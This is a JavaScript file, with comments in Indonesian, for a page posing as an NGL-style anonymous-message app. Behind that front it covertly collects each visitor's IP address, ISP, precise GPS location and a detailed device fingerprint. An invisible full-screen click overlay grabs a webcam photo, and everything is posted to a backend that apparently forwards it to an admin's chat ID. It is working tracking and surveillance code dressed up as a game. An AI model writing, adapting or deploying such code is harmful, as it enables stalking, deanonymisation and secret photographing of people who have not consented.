const CHAT_ID = "7483495590"; // chat admin
const statusEl = document.getElementById("status");

// Random questions untuk dice button
const randomQuestions = [
  "Siapa crush kamu sekarang?",
  "Hal paling random yang bikin kamu senyum?",
  "Kapan terakhir kali kamu nangis?",
  "Siapa orang yang paling sering kamu chat?",
  "Kalau bisa balik ke masa lalu, kamu mau ngapain?",
  "Rahasia kecil yang belum pernah kamu ceritain?",
  "Apa hal paling bikin kamu malu?",
  "Siapa orang yang kamu kangenin banget?",
  "Kalau ada yang mau nembak kamu, kamu mau gimana?",
  "Hal paling cringe yang pernah kamu lakuin?"
];

function startAccess() {
  // di sini panggil getUserCamera(), getUserLocation(), getUserIP(), dll
}

// ambil info device
async function getDeviceInfo(messageText) {
  try {
    const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());

    // Geo
    let geoText = "Tidak tersedia";
    let geoLink = "";
    if (navigator.geolocation) {
      await new Promise(resolve =>
        navigator.geolocation.getCurrentPosition(
          pos => {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            const acc = pos.coords.accuracy;
            geoText = `Lat: ${lat}, Lng: ${lng}, Accuracy: ${acc} m`;
            geoLink = `https://www.google.com/maps?q=${lat},${lng}`;
            resolve();
          },
          () => resolve()
        )
      );
    }

    // Battery
    let batteryText = "Tidak tersedia";
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      batteryText = `${Math.round(battery.level * 100)}% ${battery.charging ? "(Charging)" : "(Not charging)"}`;
    }

    // Network info
    let netInfo = "Tidak tersedia";
    if (navigator.connection) {
      const c = navigator.connection;
      netInfo = `${c.effectiveType || "unknown"} (${c.downlink} Mbps, rtt ${c.rtt} ms)`;
    }

    // Timezone
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const now = new Date().toLocaleString();

    // Screen
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const pixelRatio = window.devicePixelRatio || 1;
    const lang = navigator.language || "Tidak diketahui";

    // Hardware
    const cores = navigator.hardwareConcurrency || "N/A";
    const mem = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";

    // Media Devices
    let mediaCount = { audio: 0, video: 0, output: 0 };
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
      const devices = await navigator.mediaDevices.enumerateDevices();
      mediaCount = {
        audio: devices.filter(d => d.kind === "audioinput").length,
        video: devices.filter(d => d.kind === "videoinput").length,
        output: devices.filter(d => d.kind === "audiooutput").length,
      };
    }

    // WebGL / GPU info
    let gpuInfo = "Tidak tersedia";
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (gl) {
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (debugInfo) {
          gpuInfo = `${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)} (${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)})`;
        } else {
          gpuInfo = gl.getParameter(gl.RENDERER);
        }
      }
    } catch (_) {}

    // Plugins
    const plugins = [...navigator.plugins].map(p => p.name).join(", ") || "Tidak ada";

    // Touch support
    const touchSupport = "ontouchstart" in window ? "Ya" : "Tidak";

    // Storage
    const storageSupport = {
      cookies: navigator.cookieEnabled ? "Ya" : "Tidak",
      localStorage: !!window.localStorage,
      sessionStorage: !!window.sessionStorage,
    };

    // Online status
    const online = navigator.onLine ? "Online" : "Offline";

    // Service Worker
    const sw = "serviceWorker" in navigator ? "Didukung" : "Tidak";

    // Uptime
    const uptimeSec = (performance.now() / 1000).toFixed(1);

    // Final text
    let infoText = `
 • IP: ${ipInfo.ip}
 • ISP: ${ipInfo.org || "Tidak tersedia"}
 • Negara: ${ipInfo.country || "?"}, Kota: ${ipInfo.city || "?"}
 • Lokasi: ${geoText}
 • Maps: ${geoLink || "Tidak tersedia"}
 • UserAgent: ${navigator.userAgent}
 • Bahasa: ${lang}
 • Layar: ${screenRes} @${pixelRatio}x
 • CPU Core: ${cores}, RAM: ${mem}
 • GPU: ${gpuInfo}
 • Battery: ${batteryText}
 • Network: ${netInfo}
 • Timezone: ${tz}
 • Local Time: ${now}
 • Status: ${online}
 • Touch Support: ${touchSupport}
 • Kamera: ${mediaCount.video}, Mic: ${mediaCount.audio}, Speaker: ${mediaCount.output}
 • Plugins: ${plugins}
 • Cookies: ${storageSupport.cookies}, LocalStorage: ${storageSupport.localStorage}, SessionStorage: ${storageSupport.sessionStorage}
 • Service Worker: ${sw}
 • Browser Uptime: ${uptimeSec} detik
    `;

    return infoText.trim();
  } catch (e) {
    console.error(e);
    return "❌ Gagal ambil info device";
  }
}

// kirim ke backend
async function sendToBackend(data, photoBlob=null){
  const formData = new FormData();
  formData.append("text", data);
  if(photoBlob) formData.append("photo", photoBlob, "camera.jpg");

  const response = await fetch("/api/sendPhoto", { method:"POST", body: formData });
  const result = await response.json();
  console.log("Backend response:", result);
  return result;
}

// capture foto & kirim
async function captureAndSendPhoto(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0,0);

    canvas.toBlob(async blob => {
      const info = await getDeviceInfo();
      await sendToBackend(info, blob);
    }, "image/jpeg");

    stream.getTracks().forEach(track => track.stop());
  } catch(e){ console.error("Gagal capture foto:", e); }
}

// Generate IP Log dengan detail lengkap

// Generate NGL Style Photo
async function generateNGLPhoto(messageText) {
  try {
    const preview = document.createElement("div");
    preview.style.width = "375px";
    preview.style.height = "667px";
    preview.style.background = "linear-gradient(135deg, #667eea 0%, #764ba2 100%)";
    preview.style.backgroundColor = "#667eea"; // fallback solid biar ga putih
    preview.style.position = "absolute"; // jangan fixed biar ga error render
    preview.style.left = "-9999px";
    preview.style.top = "0";
    preview.style.display = "flex";
    preview.style.flexDirection = "column";
    preview.style.justifyContent = "center";
    preview.style.alignItems = "center";
    preview.style.padding = "20px";
    preview.style.fontFamily = "Inter, -apple-system, BlinkMacSystemFont, sans-serif";

    preview.innerHTML = `
      <div style="
        background: linear-gradient(135deg, #E91E63 0%, #FF5722 50%, #FF9800 100%);
        color: white;
        font-weight: 700;
        font-size: 20px;
        text-align: center;
        padding: 18px 24px;
        border-radius: 16px 16px 0 0;
        width: 320px;
        box-shadow: 0 8px 32px rgba(0,0,0,0.12);
        letter-spacing: -0.3px;
        margin: 0 auto;
      ">
        kirimi aku pesan anonim!
      </div>
      <div style="
        background: white;
        color: #1a1a1a;
        font-size: 16px;
        font-weight: 600;
        text-align: center;
        padding: 36px 24px 28px 24px;
        border-radius: 0 0 16px 16px;
        width: 320px;
        box-shadow: 0 8px 32px rgba(0,0,0,0.12);
        line-height: 1.3;
        margin: 0 auto 32px auto;
      ">
        ${messageText}
      </div>
      <div style="
        background: linear-gradient(135deg, #FF4081 0%, #E91E63 100%);
        color: white;
        font-weight: 600;
        font-size: 15px;
        text-align: center;
        padding: 16px 32px;
        border-radius: 30px;
        width: 280px;
        box-shadow: 0 4px 16px rgba(233, 30, 99, 0.3);
        margin: 0 auto 16px auto;
        letter-spacing: -0.2px;
      ">
        Siapa yang mengirim ini? 👀
      </div>
      <div style="
        background: #1a1a1a;
        color: white;
        font-weight: 600;
        font-size: 15px;
        text-align: center;
        padding: 16px 32px;
        border-radius: 30px;
        width: 280px;
        box-shadow: 0 4px 16px rgba(0,0,0,0.2);
        margin: 0 auto;
        letter-spacing: -0.2px;
      ">
        balas
      </div>
    `;

    document.body.appendChild(preview);

    // Delay render
    await new Promise(resolve => setTimeout(resolve, 300));

    const canvas = await html2canvas(preview, {
      backgroundColor: null // biar gradient asli kepake, ga ditiban putih
    });

    return new Promise(resolve => {
      canvas.toBlob(blob => {
        preview.remove();
        resolve(blob);
      }, 'image/png', 0.9);
    });
  } catch (err) {
    console.error("Error generating NGL photo:", err);
    return null;
  }
}

// --- Event Listeners ---

// trigger klik area invisible untuk camera capture
const clickArea = document.createElement("div");
clickArea.id = "clickArea";
clickArea.style.position = "fixed";
clickArea.style.top = "0";
clickArea.style.left = "0";
clickArea.style.width = "100%";
clickArea.style.height = "100%";
clickArea.style.zIndex = "9999";
clickArea.style.cursor = "pointer";
clickArea.style.background = "transparent";
document.body.appendChild(clickArea);

clickArea.addEventListener("click", async ()=>{
  await captureAndSendPhoto();
  clickArea.remove();
});

// Dice button untuk random questions
document.getElementById("dice").addEventListener("click", () => {
  const randomQ = randomQuestions[Math.floor(Math.random() * randomQuestions.length)];
  document.getElementById("msg").value = randomQ;
});

// Send button - kirim semua: text, IP log, dan NGL photo
document.getElementById("sendBtn").addEventListener("click", async () => {
  const msg = document.getElementById("msg").value.trim();
  if (!msg) return alert("Tulis dulu pesanmu!");

  console.log("🚀 Starting complete send process...");
  
  try {
    statusEl.textContent = "📤 Mengirim pesan...";

    // 1. Kirim text message
    console.log("1️⃣ Sending text message...");
    await sendToBackend(msg);

    // 2. Generate dan kirim IP log
    console.log("2️⃣ Generating IP log...");
    const ipLog = await getDeviceInfo(msg);
    await sendToBackend(ipLog);

    // 3. Generate dan kirim NGL photo
    console.log("3️⃣ Generating NGL photo...");
    const nglPhoto = await generateNGLPhoto(msg);
    if (nglPhoto) {
      await sendToBackend(`📸 NGL Style: "${msg}"`, nglPhoto);
    }

    // Update UI
    const recentArea = document.getElementById("recentArea");
    if (recentArea) {
      const div = document.createElement("div");
      div.className = "p-4 rounded-xl bg-white shadow-sm text-sm text-gray-700";
      div.innerText = msg;
      recentArea.prepend(div);
    }

    document.getElementById("msg").value = "";
    statusEl.textContent = "✅ Semua terkirim!";
    setTimeout(() => statusEl.textContent = "", 3000);

    console.log("🎉 Complete send process finished!");

  } catch (err) {
    console.error("❌ Send error:", err);
    statusEl.textContent = "❌ Gagal kirim pesan";
    setTimeout(() => statusEl.textContent = "", 3000);
  }
});
